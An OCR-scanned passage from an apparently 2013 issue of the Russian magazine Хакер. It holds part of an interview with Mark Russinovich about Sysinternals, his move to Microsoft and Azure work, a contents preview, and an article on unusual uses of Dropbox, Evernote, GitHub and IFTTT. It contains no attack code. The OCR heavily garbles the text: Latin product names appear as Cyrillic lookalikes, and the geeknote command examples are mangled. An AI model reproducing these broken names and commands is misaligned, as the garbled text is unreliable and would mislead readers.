всего около девяти месяцев. Над БоКІСЕ уже 
тогда трудилось довольно большое количество 
людей, в том числе и Мэт Питрек. О нем многие 
знают, он написал книгу «Внутреннее устройство 
ѴѴіпсІоѵѵз» для ѴѴіпсіоѵѵб 3.1. 

Я вообще в то время завел много друзей, 
которые остались со мной и по сей день. Таких 
как Джон Робинс — Мистер Отладчик, о кото- 
ром читатели, скорее всего, тоже знают. Мистер 
Отладчик. Он вел колонку Вид БІауег в журнале 
М50И и написал книгу по отладке для МісгозоК 
.МЕТ. Он все еще один из моих близких друзей. 
Живет Джон в Сиэтле, потому что очень много 
консультирует МісгозоК. Еще Джеффри Риткор, 
которого я встретил в МиМеда ТесЬпоІодіез при- 
мерно тогда же, тоже известный человек. 

Но в итоге, в своем стремлении продать 
компанию, МиМеда стала куда более ком- 
мерческой и потеряла свои хакерские корни. 

А потом закрыли разработку БоШСЕ. Его про- 
дали Сотриѵѵаге, но та тоже сочла этот проект 
неперспективным. 



КАК ЦЩ ТЕРЯЕТ ДРУЗЕЙ 



Один из ключевых моментов наступил 

для меня, когда я впервые увидел Мшіоѵѵз ИТ. 

Кажется, это была ѴѴіпбоѵѵг МТ 3.1. Тогда я ре- 
шил, что при том успехе, который имела Мпсіоѵѵз 
3.1, МпсІоѵѵз МТ, скорее всего, станет не менее 
успешной, чем ее соперник ІІМІХ. 

Хотя эта ОС все еще была нова и незрела, 
у нее был уверенный старт. Тогда я поду- 
мал — мы наблюдали потребительский рост 
в ІТ, о котором все говорят, и этот рост задала 
ѴѴіпсіоѵѵб 3.1 . Много людей используют ѴЛ/іпсіоѵѵб 
дома, а затем переносят ее в бизнес. ѴѴіпбо\л/5 
МТ позволяла запускать те же самые програм- 
мы, подтем же пользовательским интерфей- 
сом, так что было совершенно логично идти 
дальше — на рабочие станции и впоследствии 
на серверы. Для меня это стало одним из пово- 
ротных решений, потому что до этого я работал 
с юниксовыми системами, но после сосредото- 
чился на Мпсіоѵѵб. 

Поговорка «Умные люди приходят к по- 
хожим заключениям, когда решают сложные 
проблемы» применима и к операционным 
системам. Поэтому перестроиться, в общем-то, 
оказалось довольно просто. Я занимался раз- 
работкой низкоуровневых частей ІІМІХ, а ОС во 
многом пересекаются между собой. Я напи- 
сал несколько статей и презентаций на тему 
сравнения ІІМІХ и ѴѴіпсІоѵѵз N1, к примеру в чем 
разница и сходство в их работе с памятью. Раз- 
ница есть, но в основе этих ОС лежат одни и те 
же концепции. 

Одним из аспектов, который очень по- 
нравился мне в Мпсіоѵѵз ЫТ, была система 
ввода-вывода. Эта система делает ОС очень 
гибкой. Одна из моих первых популярных утилит, 
РіІеМоп, базировалась на гибкости работы 
с файловой системой: можно было просто под- 
ключить драйвер и мониторить всю активность 
1/0-стека. В ІІМІХ такое было невозможно. 

В принципе, до сих пор сложно написать нечто 
подобное под Ыпих. Что удивительно — было 
предпринято немало таких попыток (например, 
РІІ5Е), но они не увенчались успехом. 

ІІИІХ тогда не хватало гибкости. На самом 
деле я написал версию РіІеМоп под Ыпих еще 
в 1998-м. Я сделал это, пропатчив ОС так, чтобы 
можно было перехватывать системные вызовы 
(я делал такое еще в своей докторской). 

К сожалению, одновременно с этим в Ыпих 
были внесены изменения, мешавшие выдаче 
системных вызовов ядра коду, не лицензиро- 
ванному под СРІ.. Поскольку мне не хотелось 
выкладывать исходники РіІеМоп под этой лицен- 
зией, работу пришлось остановить. 

Тем не менее моя работа над ЦІЫІХ повлияла 
на развитие ядра Ыпих. В частности, мои вы- 
ступления о недостатках ядра привели к появле- 
нию таких вещей, как Від КегпеІ І_оск (механизм, 



ХАКЕР 01 /168/2013 



025 







С0ѴЕК5Т0ВѴ 



позволяющий синхронизировать одновременное 
выполнение нескольких процессов, особенно 
важный для работы с многопроцессорными си- 
стемами), 2его Сору (перемещение информации 
между несколькими областями памяти без ис- 
пользования ресурсов процессора) и многие 
другие. 



ЗАРОЖДЕНИЕ 
5Ѵ5ІІ\ІТЕРМАІ_5 И БИЗНЕСА 



Я написал РіІеМоп, РедМоп, ЫТР5 005, и это 
были первые три программы из Бузіпіегпаіз. 

Я опубликовал их на сайте друга. Этого друга 
некоторые из вас могут помнить — Эндрю 
Шульман, он написал такие книги, как «Не- 
документированный 005» и «Неофициальная 
ѴѴіпсіоѵѵз 95». 

Эти три программы хостились на его сайте, 
чтобы люди могли скачивать исходный код 
и исполняемые файлы. Но Эндрю оказался 
недостаточно ответственен. Когда у меня по- 
являлись фиксы и я просил: «Эндрю, повесь этот 
фикс», он тратил на это слишком много времени. 
Тогда я и Брайс Когсвелл (с которым мы по- 
знакомились в университете) решили запустить 
пііпіегпаіз.сот. 

Мы создали собственный сайт и стали 
выкладывать программы там. И вскоре про- 
изошел еще один поворотный момент в моей 
жизни, когда Брайс сказал: «У меня есть идея 
программы, на которой мы сможем делать 
деньги». 

ЫТР5 005 тогда была очень популярна, по- 
тому что давала людям возможность восстанав- 
ливать файлы с убитой ИТ-системы, которую 
было нельзя загрузить. Но что, если дать людям 
возможность еще и чинить системы — копиро- 
вать обновленные файлы, которые бы устраняли 
неполадки, или запускать проверку диска? 

В то время в ѴѴіпсіоѵѵз еще не было никаких 
средств восстановления системы. 

Так мы написали программу под названием 
N1 Ресоѵег, с помощью которой можно было 
монтировать диски со сломанной ІМТ-системой 
удаленно, используя приложение под 005- 
программу, загруженное с дискеты. Другой 
системный диск ѴѴіпсіоѵѵз N1 подгружался 
как виртуальный, и можно было запускать 
Ехріогег, копировать файлы и инициировать 
проверку диска. 

И мы решили, что можем получать за этот 
продукт деньги. Мы организовали ѴѴіпІегпаІз. 
сот и начали продавали его там. В свою оче- 
редь, на п(іпІегпаІ5 мы поместили небольшой 
баннер с текстом «Спонсируется ѴѴіпІегпаІз», 
выложили бесплатную версию N1 Ресоѵег (она 
позволяла только считывать информацию, 
но не давала ничего модифицировать) и на- 



правляли людей на ѴѴіпІегпаІз, где можно было 
купить полную версию. 

С 1997 года мы начали принимать к оплате 
кредитные карты. Сперва это приносило лишь 
несколько сотен долларов в месяц, но очень 
быстро дошло до нескольких тысяч долларов 
в месяц, а потом до десятков тысяч и так далее... 

Когда я устроился в ІВМ и работал в ІВМ 
РезеагсМ, Брайс все еще вкладывался в 
коммерциализацию нашей продукции, которая 
приносила большой доход. Он только тем и за- 
нимался, что копировал информацию с дискет. 
То есть он шел домой, копировал файлы с дис- 
кет, относил их на почту и отвечал на звонки 
по поддержке. 

Скоро справляться в одиночку стало слиш- 
ком тяжело, и Брайс сказал, что нам нужно 
нанять новых людей. Так мы наняли человека 
для технической поддержки и еще исполнитель- 
ного директора. Я даже специально прилетел 
(Брайсу пришлось переехать жить в Остин), 
когда мы его нанимали. 

Вскоре мы брали на работу все больше 
и больше людей. Сначала у нас работало 
пять человек, потом десять, потом двадцать 
и тридцать. В 2006 году мы представили новые 
линейки продуктов, и к 2006 году, когда нас 
купила МісгозоК, у нас было уже восемьдесят 
пять человек! 

Однако к МісгозоК присоединились только 
мы с Брайсом. МісгозоК приобрела у нас не- 
которые технологии. МісгозоК Ріадпозііс апсі 
Ресоѵегу Тооікіі (который, по сути, является 
аварийным загрузочным диском, позволяющим 
обновлять, запускать антивирус, анализировать 
системные сбои) построен на основе технологии, 
купленной у нас. Так что мы с Брайсом перееха- 
ли в Редмонд к МісгозоК. 



МІСРОБОРТ: ЛЮБИТ / НЕ ЛЮБИТ 



Вообще-то некогда я умудрился испортить 
отношения с МісгозоК, но продолжал раз- 
рабатывать свои приложения и даже наладил 
отношения достаточно для того, чтобы написать 
в соавторстве книгу о внутреннем устройстве 
ѴѴіпсіоѵѵз. Я также выступал с докладами по вну- 
треннему устройству. 

Камнем преткновения с МісгозоК стал N1 
ІЛ/огкзІаІіоп. В Редмонде утверждали, что дан- 
ная версия технически непригодна для того, 
чтобы работать в качестве веб-сервера, и про- 
граммно ограничивала работу как 115, так и лю- 
бого стороннего сервера. Веб-сервер под ИТѴѴ 
мог принимать запросы не более чем от десяти 
уникальных ІР каждые десять минут. По замыслу 
разработчиков, для такого сюжета было необ- 
ходимо приобрести значительно более дорогую 
ѴѴіпсіоѵѵз N1 4.0. 



Однако на самом деле между двумя редак- 
циями ИТ почти не было технических отличий, 
оправдывающих такой маркетинг. Выяснилось 
это в результате проведенного мной реверс- 
инжиниринга обеих версий. В свою очередь, 
это вызвало шквал критики в адрес МісгозоК 
со стороны прессы и рынка в целом. 

Моя продукция стала очень популярна 
среди техподдержки МісгозоК. Чаще всего они 
использовали РіІеМоп и РедМоп. Я стал заме- 
чать, что все больше и больше писем приходит 
от сотрудников МісгозоК. Они писали: «Нам 
очень нравится РіІеМоп, мы его каждый день 
используем». Потом в базе знаний МісгозоК 
начали появляться статьи, гласившие: «Если вы 
думаете, что у вас какая-то проблема, запустите 
РіІеМоп или РедМоп с Бузіпіегпаіз». Мне очень 
польстило, что мои программы появились в до- 
кументации МісгозоК. 

Потом я узнал, что моими программами 
пользуются и разработчики МісгозоК. Одним 
из моих первых контактов с сотрудниками 
МісгозоК стало общение со старшим разработ- 
чиком ОКісе, который ни с того ни с сего прислал 
мне е-таіі: «Какой у тебя почтовый адрес? Я бы 
хотел выслать тебе кое-что, потому что мы посто- 
янно используем РедМоп для повышения про- 
изводительности ОКісе и диагностики проблем 
при разработке». Он прислал мне очень доброе 
письмо, которое гласило: «Дорогой Марк, мы 
часто пользуемся твоими средствами при разра- 
ботке ОМісе, они отличные». К письму прилага- 
лись джойстик и несколько программ. 

Тяжело ли было перейти на работу 
в МісгозоК? МісгозоК сделала так, чтобы при- 
нять это решение было очень легко [Марк смеет- 
ся, явно намекая на щедрость своего нынешнего 
работодателя]. 

Я присоединился к команде Мпсіоѵѵ 5 . 

На самом деле моя позиция там была практи- 
чески уникальна — у меня не было никакой 
должностной инструкции. Мне пришлось самому 
соображать, что нужно сделать. Это был своего 
рода вызов — понять, как работать внутри 
МісгозоК. Как влиять на людей, какие инициа- 
тивы продвигать, какие технологии выдвигать 
на первый план. 

Я не могу выделить какие-то отдельные 
приложения и продукты и сказать: «Это сделал 

я». Уместнее будет сказать: «Я сыграл ключе- 
вую роль в продвижении такой-то идеи». Было 
сложно, но интересно. 

Мне позволяли сосредоточиться на вещах, 
которые я считал интересными и/или важными 
для МісгозоК и продукции, над которой я рабо- 
тал. Например, я работал над МіпѴѴіп (понятие, 
используемое МісгозоЙ для описания ядра 
и операционной системы, основные компоненты 
которых начали разрабатываться одновременно 
с ѴЛ/іпсіоѵѵз ѴІ5Іа). И теперь ѴѴіпсіоѵѵз РЬопе 8 по- 
строена на основе того же ядра, что и ѴѴіпсіоѵѵз. 

Я сыграл огромную роль в продвижении идеи 
разбиения \Мпсіоѵѵ5 на компоненты, чтобы 
можно было использовать их для всех наших 
программных продуктов. 

То есть у нас была Мпсіоѵѵз СЕ — ОС для мо- 
бильных устройств. Очень примитивная ОС, 



НЕКОГДА Я УМУДРИЛСЯ ИСПОРТИТЬ 
ОТНОШЕНИЯ С МІСРОБОРТ, НО ПРОДОЛЖАЛ 
РАЗРАБАТЫВАТЬ СВОИ ПРИЛОЖЕНИЯ 



026 



ХАКЕР 01 /168/2013 




Интервью с Марком Руссиновичем 




Марк на сымпровизированной автограф-сессии, состоявшейся во время ТесЬЕсі 



Мне удавалось делать многое на лету, 
буквально сразу. Допустим, на какой-нибудь 
конференции я услышал, что неплохо бы сделать 
такую-то фичу. И делаю ее прямо в самолете, 
на пути домой, а на следующей неделе уже за- 
гружаю на Зузіпіегпаіз. Такое невозможно, если 
это часть ОС. 

Есть и еще одна причина — мои программы 
нацелены на искушенных профессионалов, 
разработчиков в области ИБ и на продвинутых 
пользователей, тогда как ѴѴіпсіоѵѵз пользуется 
огромное число людей, которым неинтересна 
моя продукция, она только поставит их в тупик. 

Моя целевая аудитория нашла меня сама, 
так что, если бы я поместил Бузіпіегпаіз в ОС, это 
вряд ли увеличило бы количество пользовате- 
лей моих программ. 

Но некоторые мои утилиты все же частично 
перешли в Мпсіоѵѵб. Допустим, диспетчер задач 
или мониторинг ресурсов. Так что они все-таки 
повлияли на встроенные средства ѴѴіпсіоѵѵб. 



А последние два с половиной года я работаю 
над Мпгіоѵѵз Аіиге — платформой облачных 
сервисов. Я работаю в облачном направлении, 
потому что понял: информационный мир сейчас 
проходит через третью трансформацию. Именно 
в облачной технологии происходит основное 
развитие, это совершенно новая парадигма. Еще 
два года назад на конференциях никто не знал, 
что такое облако. А сейчас говоришь «облако» 
и все понимают, что ты имеешь в виду. 

К команде я присоединился, когда проект 
>Л/іпсіоѵѵ5 Агиге уже был в разработке. Тогда это 
был своего рода прототип. Как раз когда я начал 
работу над ним, его впервые выпустили как ком- 
мерческий продукт, но это была совершенно 
новая платформа. Ее нужно было развивать 
и улучшать. 

Я работал над идеей «инфраструктура 
как сервис» — функционал, выпущенный 
прошлым летом. Я был ведущим архитектором 
этого функционала, определял, как эта модель 
(ІааБ) будет работать изнутри, как мы будем ис- 
пользовать хранилище ѴѴіпгіо\л/5 Агиге, каковы 
требования по производительности, какова 
надежность. 

Работал я и над другими направлениями, 
которые меня интересовали, к примеру управ- 
ление ресурсами дата-центров. Я разбирался, 
как правильно задеплоить его на виртуальных 
машинах, чтобы добиться максимальной эффек- 
тивности использования ресурсов. Как балан- 
сировать нагрузку, какие мощности выделять 
под виртуальные машины — все это интересные 
проблемы в области СотріЛег Бсіепсе, которыми 
я сейчас занимаюсь в МісгозоК РезеагсЬ. 

Тем не менее следы моих наработок замет- 
ны и в других продуктах МісгозоК. Например, 
новый диспетчер задач в ѴѴіпсіоѵѵз 8 явно несет 
на себе след Ргосезз Мопііог и других подобных 
утилит. 



В свое время слову «хакер» пытались придать 
негативную окраску, но изначально считалось, 



разработанная в середине-конце девяностых 
годов, когда устройства были намного проще. 

У нее плохая защита, слабая многозадачность, 
недостаточно адресного пространства... словом, 
почти нет всей той функциональности, которая 
требуется современной ОС для работы, безопас- 
ности и надежности. 

Стало ясно, что нельзя развивать такую 

ОС. Телефоны сейчас — это те же компьютеры, 
так что логично поставить на них настоящую 
ОС. Тот же подход применила Арріе, когда они 
взяли сердце 05 X и сделали Ю5 для телефонов. 
Логично, что мы сделали то же самое. 

Но вернемся к тому, что у нас были еще 
и бесплатные Зузіпіегпаіз, а также коммер- 
ческие \Л/іпІегпаІ5, о которых я говорил выше. 
МісгозоК использовала наш дефрагмента- 



тор при создании движка дефрагментации 
для \Л/і пс1о\л/5 N1 Также у нас была утилита под 
названием Ргоіесііоп тападег, которая могла 
блокировать рекламу, что, в свою очередь, при- 
вело к самостоятельному продукту по блокиров- 
ке рекламы. 

Утилиты 5у5ІпІегпаІ5 не стали частью 
ОС по нескольким причинам. Первая: я обнов- 
ляю их достаточно часто и постоянно добавляю 
новые возможности. Если бы они были частью 
ОС, они обновлялись бы только с регулярны- 
ми релизами ОС — раз в год (раньше вообще 
раз в два-три года, просто сейчас дело пошло 
побыстрее). То есть я бы не смог обновлять их 
так часто. Вторая: если программа — часть ОС, 
нужно быть предельно осторожным с качеством 
кода. Это крайне важно. 



ПРИКОСНУЛСЯ К ОБЛАКАМ 



КНИГА НУЛЕВОГО ДНЯ 



ХАКЕР 01 /168/2013 



027 








С0ѴЕВ5Т0КѴ 




что хакер — человек, который хорошо разби- 
рается в компьютерах. И только потом это слово 
начало ассоциироваться с чем-то вредоносным. 
Для меня оно содержит оба эти понятия, в за- 
висимости от контекста. Можно сказать: «Вас 
кто-то хакнул». Сетевые специалисты и спе- 
циалисты по безопасности используют слово 
«хакер» именно в этом смысле. Однако хакер 
также означает и человека, мастерски владею- 
щего компьютером. 

Не знаю, могу ли я называть себя хакером. 

Никогда не думал о себе как о хакере. Скорее 
как о программисте. Думаю, хакерство для меня 
значит, что необязательно понимать все, 
что ты делаешь, но нужно понимать достаточно, 
чтобы достигать результатов. А я скорее стара- 
юсь познать науку досконально и лишь потом 
приложить эти знания к программированию. Так 
что не уверен, что готов назвать себя хакером 
в полном смысле этого слова. 



Я всегда хотел написать книгу. В детстве 
я читал научную фантастику и технотриллеры, 
и меня всегда восхищало переплетение техноло- 
гии и хорошего сюжета. Это был интересный вы- 
зов для меня — понять, смогу ли я это сделать. 

Идея книги 2его йау возникла у меня еще 
в 2004 году, когда я осознал риск кибертер- 
роризма и опасность хакеров, которые могли 
нанести реальный вред. Это очень насущная 
угроза. Оказалось, что Евгений Касперский со- 
гласен со мной и в последнее время тоже много 
говорит об этом. 

Я хотел подчеркнуть связанные с этим 
риски, донести до людей реальность угрозы. 

В то же время было очень интересно написать 
историю, в которой технологии и мир кибербе- 
зопасности были бы описаны реалистично. Су- 
ществует не так много книг (пожалуй, я не знаю 
ни одной), в которых авторы попытались бы 
рассказать людям, какова жизнь человека, ра- 



ботающего в области кибербезопасности. А я хо- 
тел, чтобы моя книга стала именно такой. Плюс 
я хотел рассказать хорошую историю и очертить 
риски. Так что книга близка к реальности. 

Было продано большое количество экзем- 
пляров, достаточное для того, чтобы издатель- 
ство запросило продолжение, которое вышло 
несколько месяцев назад. И они подписали меня 
на еще две книги. 



СОВЕТЫ МАРКА 



Чтобы стать успешным в ІТ, нужно найти 
область, которая тебе интересна. Область, в ко- 
торой работает не так много людей. Обычно это 
означает, что она достаточно сложная, — ведь 
люди стараются держаться подальше от трудно- 
стей. Я нашел именно такую. 

В такой области будет куда меньше конку- 
ренции, и твоя ценность будет очень высока. 
Нужно найти максимум информации по теме, 
изучить ее как можно глубже. Если работа 
не совпадает с твоим истинным увлечением, то, 
скорее всего, ты выбрал не ту профессию. И это 
применимо не только к ІТ. 

И последнее — получайте образование. 
По-моему, это очень важно. Сейчас многие люди 
обходятся без образования, но, мне кажется, 
образование дает структуру, вырабатывает под- 
ход к обучению, а это полезно — помогает легче 
схватывать принципы. В моем случае это было 
очень ценно Ш 



виннннннишвіннннвннннннннвннннинв 

ХАКЕРСТВО ДЛЯ МЕНЯ ЗНАЧИТ, ЧТО 
НЕОБЯЗАТЕЛЬНО ПОНИМАТЬ ВСЕ, ЧТО ТЫ 
ДЕЛАЕШЬ, НО НУЖНО ПОНИМАТЬ ДОСТА- 
ТОЧНО, ЧТОБЫ ДОСТИГАТЬ РЕЗУЛЬТАТОВ 



028 



ХАКЕР 01 /168/2013 







Ргеѵіеѵѵ 



29 страниц на одной полосе. 
Тизер некоторых статей. 



РС20ЫЕ 




ВЛАСТЬ ТОЛПЕ 

Некоторые продукты неспособны вы- 
звать интерес инвесторов в лице крупных 
венчурных фондов или именитых пред- 
принимателей, несмотря на всюсвою ге- 
ниальность. К счастью, для таких случаев 
появилась интересная альтернатива— 
платформа Кіскзіагіег. 

С ее помощью авторы проектов могут 
устранитьпосредников и искатьфинан- 
сирования непосредственноусвоей це- 
левой аудитории. Однако для того, чтобы 
заставитьлюдей поверитьвтебя и про- 
голосовать кошельком , необходимо 
как следует подготовиться. Читай ин- 
струкцию отлюдей, имеющих реальный 
опыт работы с новой площадкой. 




РС20ЫЕ 



Х-МОВИЕ 




НАСЕДЬМОМНЕБЕ 

32 8 этом материале мы собрали самые 

нестандартные применения привычных 
облачныхсервисов. 



42 



БОЛЬШАЯ ТРОЙКА 

Подводим итоги первой пятилетки 
в новейшей истории мобильного рынка: 
Апсігоігі, іОБ и ѴѴіпсіоѵѵз РЬопе 7. 



48 



ЛУЧШЕЕ — ДРУГ ХОРОШЕГО 

Практическое руководство по сборке 
собственной прошивки для Апгігоісі- 
смартфона. 



ВЗЛОМ 



МАІ.ѴѴАКЕ 




70 



ПРЕДСКАЗАНИЯ СБЫВАЮТСЯ 

Подробный анализ новых векторов атак 
на генератор псевдослучайных чисел 
в современных версиях РНР. 



82 



КРИПТОРОМ ПО АНТИВИРУСУ 

Сиквел для прошлогоднего тест- 
драйва семи популярных антивирусов 
с неожиданным результатом. 



86 



С5РРВМАССЫ! 

Как баннерные сети позволяют прово- 
дить атаки с максимальным охватом 
и привлекательным кушем. 



ХАКЕР 01 /168/2013 



029 













РС20ЫЕ 



Мария «МІІгіІІ» Нефедова 




Облачные сервисы день ото дня становятся все популярнее. Наверняка многие наши читатели уже 



успели привыкнуть к удобству йгорЬох (а может, ЗкуОгіѵе или Ооодіе Огіѵе), Еѵегпоіе, ЭііНиЬ, сервисам 
Атагоп и так далее. Но какими нетривиальными способами можно эксплуатировать все тот же Еѵег- 
поіе или как использовать ОгорЬох в качестве блог-клиента? Для облачных сервисов существует 
множество полезных аддонов и готовых рецептов, которые здорово облегчают жизнь. Мы собрали 
наиболее интересные решения, которые могут тебе пригодиться. 



ХРАНИМ КОНФИГИ В 6ІТНІІВ 



Подходит для: СіЖиЬ 



діІЬиЬ.сот/гіоНіІев/гіоМіІеа.діІЬиЬ.сот 



Странно, но не многим известно, что в се- 
редине 2012 года на ОііНиЬ появилась 
возможность хранить дотфайлы. Для это- 
го достаточно воспользоваться патчем, 
пройдя по приведенной ссылке. Разумеет- 
ся, бііНиЬ будет не просто выступать скла- 
дом, но предоставит возможность редак- 



тирования, синхронизации и восстановления 
конфигов. Также можно делиться, обсуждать 
и так далее, что уже вполне традиционно. 

Создатели также уверяют [ гіоіііІе5.діІЬиЬ. 
сот ), что, по их мнению, изучение чужих 
дотфайлов и обмен опытом в этом вопросе — 
прекрасная школа, позволяющая делиться 




своими знаниями с другими и узнавать 
новое. То есть сервис может оказаться по- 
лезен еще и с этой точки зрения. Впрочем, 
это, конечно, уже дело вкуса для каждого 
разработчика. 



ПРОСТОЙ И УНИВЕРСАЛЬНЫЙ ПЛАНИРОВЩИК В ОБЛАКЕ 



Подходит для: ОгорЬох 




ІіпуигІ.сот/сокиіѵѵі 





ТоЬо.ІхІ ТоисЬ — невероятно простое 
приложение. Множество англоговорящих 
людей составляют и хранят свои списки 
дел в обыкновенном текстовом файлике 
ІосІо.М, что и подметила как-то раз Джина 
Трапани. 

Находчивая женщина недаром является 
основательницей Ы^еЬаскег, она решила 
создать соответственное приложение, 
что с успехом и сделала. На сегодняшний 



день существуют версии ТосІо.М ТоисЬ 
для Ю5, Апсігоісі и для ѴѴіпЬоѵѵз РЬопе 7. 

Повторюсь, менеджер задач от Трапани 
чрезвычайно прост: составляем список 
дел, указывая приоритет их выполнения. 
Есть также поддержка проектов и контек- 
стов, но очень ограниченная. Казалось бы, 
что здесь необычного? Всего одна малень- 
кая деталь — задачи хранятся в про- 
стом текстовом файле в ОгорЬох. На это 









и делается упор: никаких проприетарных 
форматов, список дел всегда под рукой, его 
можно открыть и прочесть и отредактиро- 
вать под любой ОС. 

Стоит сказать, что мобильное приложе- 
ние платное, хотя и обойдется всего в $ 1,99. 



032 



ХАКЕР 01 /168/2013 





На седьмом небе 



ХРАНИМ В ОБЛАКЕ ЛОГИ 



Подходит для: Еѵегпоіе 



оеекпоіе.те 



Еѵегпоіе — штука популярная. По офи- 
циальным данным, в конце 2011 года 
сервисом пользовалось свыше двадца- 
ти миллионов человек. Неудивительно, 
что для Еѵегпоіе создано немало полезных 
надстроек и нестандартных решений. Одна 
из таких необычных идей — консольный 
клиент под названием беекпоіе. На первый 
взгляд может показаться, что беекпоіе — 
игрушка для гиков, не слишком полезная 
в быту. Это не совсем так. С помощью 
беекпоіе из командной строки І_іпих можно 
работать со знаменитым веб-сервисом 
(только с текстовыми заметками), что от- 
крывает определенные возможности. 
Например, использовать его для хранения 
логов сервера или же для работы с доку- 
ментами на языке Магксіоѵѵп. 

Одна из основных фишек клиента — 
любую заметку можно редактировать 
в обычном консольном текстовом редак- 



торе, который тебе больше нравится, — 
папо, тсесііі и так далее. Вводим команду, 
передаем слово ѴѴРІТЕ в качестве атрибута 
контента, и открывается текстовый редак- 
тор по умолчанию. После редактирования 
заметки в редакторе она прогоняется 
через Магксіоѵѵп-обработчик и сохраняется 
в Еѵегпоіе. 

Еще одна важная и полезная особен- 
ность — синхронизация локальных дирек- 
торий с файлами с блокнотами в Еѵегпоіе, 
реализованная благодаря приложению 
дпзупс. Любые логи, отчеты, документы 
и прочее будут автоматически добавляться 
в нужный блокнот Еѵегпоіе после непро- 
должительного «шаманства». Пример 
команды: 

$ дпзупс --раТЬ /боте/ргозес*/-* 
хтрр/1о§5/ --тазк "*.1о§5" ♦-< 
--ІоёраСН /Ьоте/изег/Іодз/— 




хтрр2еѵегпо*е.1о§ — 

--поІеЬоок "ХМРР Іо^з" 

В целом у клиента много приятных 
особенностей. К примеру, можно создавать 
заметку напрямую через консоль или ука- 
зать в качестве источника текстовый файл. 
Для последнего будет достаточно команды: 

$ §еекпо*е сгеа*е --1:і*1е «-< 

"ІлІеЬ-5І*е диеие5" --соп-Сеп* /Ьоте/«-' 
ѵѵеЬзі'Ье/яиеиез.Іоб --поТеЬоок ♦-« 
"Ргч^есЬБ" --*аез "диеиез, 1о§з" 

Кстати, на сайте работает интерактивный 
веб-терминал І деекпоіе.те/Ігѵ ). Можно 
опробовать клиент, ничего не скачивая. 



ХОСТИНГ ДЛЯ БЛОГА И СМ5 



Подходит для: ОгорЬох 



Бсгіріодг.ат, Саіе ріп.со. Ргоррадез.сот. Рап саке.іо 



Самое простое «альтернативное примене- 
ние» облачному хостингу пришло в голову 
сетевым Кулибиным практически одновре- 
менно с возникновением самого йгорЬох. 
Конечно же, йгорЬох можно использовать 
в качестве хостинга для своего сайта/бло- 
га. Целый ряд вспомогательных сервисов 
позволит справиться с этой задачей бук- 
вально в два клика. 

Пожалуй, самые известные и простые 
решения для создания блога на РгорЬох — 
это Бсгіріодгат и Саіеріп. В обоих случаях 
достаточно зайти на сайт, авторизоваться 
в РгорЬох, дать приложению добро на до- 
ступ, а затем ввести имя и краткое описа- 
ние блога. Саіеріп также попросит указать 
логин в Тѵѵіиег, чтобы скопировать оттуда 
аватар и добавить к блогу кнопку «РоІІоѵѵ». 
На выходе мы получаем адрес вида 
«зсгіріодг.ат/логин» или «логин.саіеріп. 
со» и крайне примитивный, но работающий 
блог. Как создавать новые записи, раз- 
берется даже далекий от ІТ человек. Атем, 
кто разбирается в теме, окажутся полезны 
более продвинутые возможности — при- 
крутить к блогу боодіе Апаіуіісз, добавить 



комментарии через Оізциз, возможность 
делать отложенные посты и так далее. 
Бсгіріодгат также поддерживает темы 
оформления, умеет автоматически постить 
в социальные сети и имеет собственный 
АРІ для редакторов. Чуть более сложный 
вариант по созданию блога предлагает нам 
Цгоррадез. Здесь ты даже можешь сразу 
подумать о дизайне, выбрав одну из трех 
представленных тем оформления (какое 
изобилие!). Далее тему придется скачать 
и распаковать в ЦгорЬох, в заранее соз- 
данную папку вида уоиг_пате.сІгорраде5. 
сот. Ну а после дело за малым — расша- 
риваем созданную папку, во всплывающей 
форме вводим адрес зегѵегІЙЬгоррадез. 
сот и смиренно ждем, когда создатели 
сервиса заапрувят нашу заявку (да, это де- 
лается вручную). Вуаля! — сайт готов. Все 
текстовое содержимое находится в папке 
«Сопіепі» и может быть отредактировано 
в любом редакторе. Тему также можно 
при желании подправить или передать 
вовне. 

Еще одно решение — Рапсаке.іо. Опять 
же достаточно авторизации в ОгорЬох, 



ОгорРаде$.сот 




после чего можно легко трансформировать 
файлы (1x1, тЬ, ]рд, іред, рпд, діі, рсі(, Ьос, 
Ьосх, хіз, хізх, ррі, рріх) в материалы блога/ 
сайта. Можно также создать собствен- 
ную тему оформления, а не использовать 
готовые. 

Замечу, что практически все перечис- 
ленное работает благодаря языку разметки 
Магксіоѵѵп и совершенно бесплатно. Од- 
нако не стоит забывать, что у бесплатного 
ОгорЬох есть ограничение трафика (20 Гб 
в день), которое распространяется на все 
открытые папки. Запустить сверхпопуляр- 
ный блог вряд ли получится — аккаунт 
могут засуспендить. Чтобы такой проблемы 
не возникло, можно попробовать хранить 
фото-, аудио- и видеоконтент в другом 
месте, вставляя его в блог по мере надоб- 
ности. 



ХАКЕР 01/168/2013 



033 






РС20ЫЕ 



СИНХРОНИЗИРУЕМ КНИГИ САФРОЮ-ПЛАНШЕТОМ 



Подходит для: йгорЬох 



ІіпѵигІ.сот/гіѵѵті7х 



рі РаЬгік 


■і 


о 


і 







■Щ 


Асіѵепіигез о( ЗЬегІоск НоІте$ , 


1532: 





Еще одно удобное и, что характерно, со- 
вершенно бесплатное решение с поддерж- 
кой йгорЬох — облачная читалка РаЬгік 
Реасіег. АпсІгоісІ-приложение для чтения 
электронных книжек поддерживает самые 
актуальные на сегодня форматы Іхі, еРиЬ 
и МОВІ (РйР в экспериментальном режиме), 
может похвастаться удобным и приятным 
интерфейсом, но на фоне других «читалок» 
его, конечно, выделяет облачная состав- 



ляющая. РаЬгік умеет синхронизироваться 
с ОгорЬох. Притом имеется возможность 
синхронизации не только самой коллек- 
ции книг, но и прочих нужных параметров, 
изменяемых в процессе чтения (последняя 
открытая страница, закладки и так далее). 
Эта особенность, конечно, значительно 
облегчает использование приложения 
на разных устройствах. 

Как не трудно догадаться, РаЬгік «за- 



и. АІісе іп \Ѵоп6егІап<1 






г ' ••• 38 2 \ 




Г Л 



точен» для использования на смартфонах 
и планшетах. Клиента для РС нет, и пользо- 
ватели ідевайсов тоже пока не у дел. Впро- 
чем, создатели обещают в будущем и новые 
форматы и кроссплатформенность, правда, 
неизвестно, когда именно этого ждать. 










— 






СВЯЗЫВАЕМ ВСЕ, ЧТО МОЖНО 



Подходит для: Универсален 



іГЩ.сот 



ІРТТТ — очень удобный и известный сервис, 
достойный отдельной развернутой статьи. 

Он позволяет создавать различные рецепты 
(мэшапы) для связи самых разных веб- 
приложений друг с другом (и не только). 

Идея ІРТТТ проста, как и все гениальное, 
— сторонних сервисов много, между ними 
порой хочется наладить «контакт», но это не 
всегда предусмотрено разработчиками. Бла- 
годаря ІРТТТ искать «народные решения» 
больше не нужно, ведь здесь представлены 
тысячи уже готовых рецептов. К примеру, 
если я публикую запись в Тѵѵіиег, об этом 
нужно написать в РасеЬоок, или можно 



